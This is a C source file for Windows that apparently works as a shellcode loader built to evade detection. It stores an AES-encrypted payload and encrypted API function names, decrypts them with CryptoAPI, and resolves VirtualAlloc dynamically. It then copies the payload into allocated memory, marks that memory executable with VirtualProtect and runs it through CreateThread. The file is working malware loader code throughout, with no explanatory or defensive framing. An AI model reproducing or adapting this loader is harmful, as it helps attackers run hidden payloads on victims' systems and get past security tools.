#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include<tlhelp32.h>

typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef VOID(WINAPI* RtlMoveMemory_t)(VOID UNALIGNED* Destination, const VOID UNALIGNED* Source, SIZE_T Length);


char key[] = { 0x50, 0x9d, 0x54, 0xe3, 0x35, 0x18, 0x93, 0x6, 0xcf, 0x5, 0x92, 0xfe, 0xbf, 0x2d, 0x3f, 0x7f };
char unsigned payload[] = { 0xd5, 0x14, 0xa4, 0x2c, 0x35, 0x53, 0x68, 0x54, 0x3a, 0xb9, 0x1b, 0x9e, 0xce, 0xb, 0x63, 0xff, 0x30, 0xa6, 0xf2, 0x3d, 0x72, 0xc7, 0x3f, 0x78, 0x5f, 0x7f, 0x79, 0x7a, 0xa9, 0xe4, 0x59, 0x5, 0xb, 0x2c, 0x84, 0xaf, 0xce, 0xfc, 0x69, 0x38, 0xa3, 0x83, 0x1d, 0x38, 0x14, 0xd9, 0xb3, 0x68, 0x4b, 0x39, 0x1a, 0xb4, 0x8a, 0x59, 0x6, 0x6c, 0x9b, 0x71, 0xc7, 0x2e, 0xac, 0xec, 0x65, 0xd9, 0x1b, 0x4e, 0x3c, 0x57, 0xff, 0xb4, 0x19, 0x5e, 0x74, 0x26, 0x57, 0x87, 0x3d, 0xf3, 0xe9, 0x12, 0x4a, 0x5c, 0x9b, 0xe1, 0x26, 0x3d, 0xca, 0x45, 0xb, 0xb5, 0x68, 0x97, 0xb6, 0x6, 0x1e, 0x83, 0x72, 0x1c, 0x1b, 0xf4, 0x17, 0xd8, 0xe5, 0xd1, 0xda, 0xa, 0xc, 0x6c, 0x90, 0x8f, 0xd8, 0xe0, 0x66, 0xe8, 0xfa, 0xa4, 0xfb, 0x5f, 0x72, 0x70, 0x2a, 0xf6, 0xf1, 0x6f, 0x85, 0x2d, 0x9, 0xf9, 0x32, 0x6d, 0xc4, 0x55, 0x1c, 0xc6, 0x17, 0x9e, 0xac, 0x6a, 0xa3, 0xc, 0xa5, 0x41, 0xb9, 0x82, 0xa0, 0x23, 0xb3, 0xa1, 0x58, 0x5a, 0xe3, 0xec, 0x58, 0xd4, 0x3c, 0xa9, 0xe6, 0x6a, 0xc5, 0xbd, 0x84, 0xa0, 0xe4, 0x9d, 0x9c, 0x9b, 0x9f, 0xfb, 0xfd, 0xbe, 0x9e, 0xe2, 0x4d, 0x59, 0x67, 0x88, 0x7c, 0xc9, 0x9d, 0xdb, 0xce, 0xed, 0xe0, 0x74, 0xf4, 0xda, 0x4, 0xaf, 0xfb, 0xc4, 0x89, 0x55, 0xe2, 0x94, 0x2c, 0x9d, 0xa7, 0x9d, 0x0, 0x83, 0x7d, 0x55, 0x37, 0xba, 0xe8, 0xb6, 0xe1, 0x4, 0x4a, 0xe5, 0xc4, 0xcf, 0x7d, 0x52, 0x48, 0x28, 0x14, 0x77, 0x9a, 0xab, 0x61, 0xbb, 0xa, 0x76, 0x19, 0x23, 0x5d, 0xdd, 0xa2, 0xa, 0xb0, 0x29, 0xc5, 0xeb, 0x3c, 0xeb, 0x5a, 0xbd, 0x48, 0x3c, 0xb2, 0x2, 0x31, 0x8b, 0xda, 0x79, 0x84, 0x3c, 0x74, 0x2, 0xba, 0x4, 0xc0, 0x81, 0xe9, 0x3d, 0xed, 0x7, 0xf9, 0x46, 0xc3, 0x83, 0xc5, 0xc0, 0xb7, 0xa9, 0xee, 0xac, 0xf2, 0xe7, 0x5f, 0x23, 0xc, 0x62, 0x38, 0x48, 0xba, 0xe5, 0x24, 0x78, 0x26, 0x1e, 0x85, 0x17, 0xe2, 0x12, 0x54, 0x6c, 0x20, 0x46, 0xe8, 0x61, 0x26, 0xf, 0x4b, 0x6c, 0xdf, 0xbe, 0x97, 0xe5, 0xf3, 0x5e, 0x73, 0x74, 0x73, 0xe6, 0xde, 0xd, 0xbb, 0xa4, 0x55, 0x8f, 0x99, 0xe5, 0x11, 0x19, 0xda, 0xbe, 0x17, 0x17, 0x7f, 0xfd, 0x29, 0xd6, 0xbc, 0xd6, 0xa6, 0x8d, 0x1e, 0x41, 0x9a, 0x1f, 0x9a, 0x5a, 0x9b, 0x37, 0xe, 0x83, 0x4c, 0x28, 0x18, 0xda, 0x7c, 0xbd, 0xd8, 0x73, 0x3a, 0xb9, 0xd7, 0x7f, 0x98, 0x8a, 0xca, 0x90, 0x55, 0x71, 0x45, 0x13, 0x70, 0x7b, 0xb8, 0xfd, 0x8b, 0xdc, 0xf0, 0x88, 0x62, 0x3d, 0x8e, 0x96, 0xf8, 0x51, 0xe7, 0x6, 0xa5, 0x81, 0x47, 0xc8, 0x61, 0xc9, 0xf1, 0x2e, 0x6c, 0x76, 0x38, 0xa5, 0xe8, 0x5, 0x1a, 0x86, 0x15, 0x2d, 0xd6, 0x43, 0xf4, 0x41, 0x64, 0xbe, 0x19, 0xf3, 0x50, 0x2d, 0xe7, 0xf3, 0x20, 0x76, 0x21, 0x31, 0x8b, 0x7c, 0x2c, 0xe8, 0x10, 0x9b, 0xc1, 0xc, 0xbc, 0xd8, 0xf6, 0x22, 0x3c, 0x58, 0x0, 0xec, 0xdc, 0xda, 0x50, 0x2, 0x4, 0x87, 0x20, 0x6a, 0x84, 0xba, 0x69, 0x4, 0xf1, 0x58, 0x46, 0x50, 0xb7, 0x83, 0xd5, 0x1e, 0x44, 0xdd, 0xf2, 0x93, 0xab, 0xf2, 0xd, 0xe5, 0x2a, 0x4, 0xb5, 0x8, 0x90, 0x2f, 0x50, 0xe5, 0x1e, 0xcc, 0xa2, 0x87 };
char unsigned cipher_vProtect[] = { 0x99, 0xef, 0x4f, 0x88, 0x47, 0x18, 0xef, 0xe3, 0x99, 0xde, 0xc7, 0x78, 0x88, 0x8b, 0xb9, 0x80 };
char unsigned cipher_vAlloc[] = { 0xf0, 0xe5, 0xef, 0xb9, 0xe, 0x27, 0xec, 0x3c, 0x14, 0x79, 0x31, 0x78, 0xf, 0xf7, 0x67, 0x27 };
char unsigned cipher_rMoveMemory[] = { 0x60, 0xc9, 0x24, 0x17, 0x11, 0xb9, 0xa6, 0x93, 0xa0, 0x27, 0x25, 0xfb, 0x8f, 0xec, 0x8e, 0x27 };
unsigned int len_payload = sizeof(payload); 
unsigned int len_key = sizeof(key);

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;


        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

int main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	LPVOID exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	unsigned int payload_len = sizeof payload;

	AESDecrypt((char*)cipher_vProtect, sizeof cipher_vProtect, (char*)key, sizeof key);
	AESDecrypt((char*)cipher_vAlloc, sizeof cipher_vAlloc, (char*)key, sizeof key);
	AESDecrypt((char*)cipher_rMoveMemory, sizeof cipher_rMoveMemory, (char*)key, sizeof key);
	//AESDecrypt((char*)cipher_cThread, sizeof cipher_cThread, (char*)key, sizeof key);
	cipher_vProtect[14] = '\0';
	cipher_vAlloc[12] = '\0';
	//cipher_cThread[] = '\0';
	printf("%s\n", cipher_vProtect);
	printf("%s\n", cipher_vAlloc);
	//printf("%s\n", cipher_cThread);


	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(GetModuleHandle(L"KERNEL32.DLL"), (char *)cipher_vAlloc);
	//VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(GetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
	//RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t)GetProcAddress(GetModuleHandle(L"KERNEL32.DLL"), (char *) cipher_rMoveMemory);
	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t)GetProcAddress(GetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");


	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	/*
	printf("%-20s : 0x%-016p\n", "addr of void * payload", (void*)payload);
	printf("%-20s : 0x%-016p\n", "payload & addr", &payload);
	printf("%-20s : 0x%-016p\n", "payload addr", payload);

	printf("%-20s : 0x%-016p\n", "exec_mem void * addr", (void*)exec_mem);
	printf("%-20s : 0x%-016p\n", "exec_mem  addr", exec_mem);
	printf("%-20s : 0x%-016p\n", "exec_mem &  addr", &exec_mem);
	*/

	AESDecrypt((char*)payload, payload_len, (char*)key, sizeof key);



	//cout << " payload " << payload << " key " << key;
	pRtlMoveMemory(exec_mem, payload, payload_len);

	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}